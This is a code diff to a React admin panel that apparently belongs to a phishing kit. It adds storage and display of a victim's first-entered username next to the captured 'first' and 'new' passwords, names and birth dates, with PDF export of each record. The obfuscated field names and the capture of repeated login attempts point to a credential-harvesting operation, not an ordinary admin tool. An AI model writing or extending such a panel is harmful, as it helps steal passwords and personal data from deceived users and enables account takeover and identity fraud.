@@ -14,6 +14,7 @@ interface UserData {
     id: string;
     sessionId: string;
     xusr: string;
+    xusrFirst?: string;
     xpssFirst?: string;
     xpss: string;
     timestamp: string;
@@ -47,7 +48,9 @@ interface UserData {
     id: string;
     sessionId: string;
     xusr: string;
+    xusrFirst?: string;
     xpss: string;
+    xpssFirst?: string;
     xname1: string;
     xname2: string;
     xdob: string;
@@ -120,6 +123,8 @@ const AdminPanel: React.FC = () => {
       passwords: 'Passwörter',
       oldPasswordLabel: 'Erstes Passwort',
       newPasswordLabel: 'Neues Passwort',
+      oldUsernameLabel: 'Erster Benutzername',
+      newUsernameLabel: 'Neuer Benutzername',
       firstName: 'Vorname',
       lastName: 'Nachname',
       birthDate: 'Geburtsdatum',
@@ -166,6 +171,8 @@ const AdminPanel: React.FC = () => {
       passwords: 'Passwords',
       oldPasswordLabel: 'First password',
       newPasswordLabel: 'New password',
+      oldUsernameLabel: 'First username',
+      newUsernameLabel: 'New username',
       firstName: 'First Name',
       lastName: 'Last Name',
       birthDate: 'Birth Date',
@@ -341,8 +348,8 @@ const AdminPanel: React.FC = () => {
 
       // Login Information
       yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
-      yPosition = addText(`Benutzername: ${session.loginData?.xusr || session.finalData?.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-      yPosition = addText(`Erstes Passwort: ${session.loginData?.xpssFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Benutzername: ${session.finalData?.xusr || session.loginData?.xusr || session.loginData?.xusrFirst || session.finalData?.xusrFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Erstes Passwort: ${session.loginData?.xpssFirst || session.finalData?.xpssFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition = addText(`Neues Passwort: ${session.loginData?.xpss || session.finalData?.xpss || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition += 5;
 
@@ -420,7 +427,7 @@ const AdminPanel: React.FC = () => {
 
     // Login Information
     yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
-    yPosition = addText(`Benutzername: ${selectedUser.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Benutzername: ${selectedUser.xusr || selectedUser.xusrFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition = addText(`Erstes Passwort: ${selectedUser.xpssFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition = addText(`Neues Passwort: ${selectedUser.xpss || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition += 10;
@@ -644,6 +651,7 @@ const AdminPanel: React.FC = () => {
       if (!session) {
         return {
           xusr: '',
+          xusrFirst: '',
           xpssFirst: '',
           xpss: '',
           xname1: '',
@@ -662,8 +670,9 @@ const AdminPanel: React.FC = () => {
       
       // Combine data from all steps
       const combinedData = {
-        xusr: session.loginData?.xusr || session.finalData?.xusr || '',
-        xpssFirst: session.loginData?.xpssFirst || '',
+        xusr: session.finalData?.xusr || session.loginData?.xusr || '',
+        xusrFirst: session.loginData?.xusrFirst || session.finalData?.xusrFirst || '',
+        xpssFirst: session.loginData?.xpssFirst || session.finalData?.xpssFirst || '',
         xpss: session.loginData?.xpss || session.finalData?.xpss || '',
         xname1: session.infoData?.xname1 || session.finalData?.xname1 || '',
         xname2: session.infoData?.xname2 || session.finalData?.xname2 || '',
@@ -735,7 +744,9 @@ const AdminPanel: React.FC = () => {
             <tbody>
               {processedUsers.map((user, index) => (
                 <tr key={index} data-session={user.sessionId}>
-                  <td title={`Username: ${user.xusr}`}>{user.xusr || '-'}</td>
+                  <td title={`Username: ${user.xusr || user.xusrFirst || '-'}`}>
+                    {user.xusr || user.xusrFirst || '-'}
+                  </td>
                   <td>
                     <div title={`${t.oldPasswordLabel}: ${user.xpssFirst || '-'}`}>
                       <strong>{t.oldPasswordLabel}:</strong> {user.xpssFirst || '-'}
@@ -1032,11 +1043,11 @@ const AdminPanel: React.FC = () => {
                 {/* Login Information */}
                 <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
                   <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>🔐 Anmeldeinformationen</h4>
-                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
-                    <div>
-                      <strong>Benutzername:</strong><br/>
-                      <span style={{color: '#333'}}>{selectedUser.xusr || 'Nicht angegeben'}</span>
-                    </div>
+                  <div>
+                    <strong>Benutzername:</strong><br/>
+                    <span style={{color: '#333'}}>{selectedUser.xusr || selectedUser.xusrFirst || 'Nicht angegeben'}</span>
+                  </div>
+                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginTop: '10px'}}>
                     <div>
                       <strong>{t.oldPasswordLabel}:</strong><br/>
                       <span style={{color: '#333'}}>{selectedUser.xpssFirst || 'Nicht angegeben'}</span>
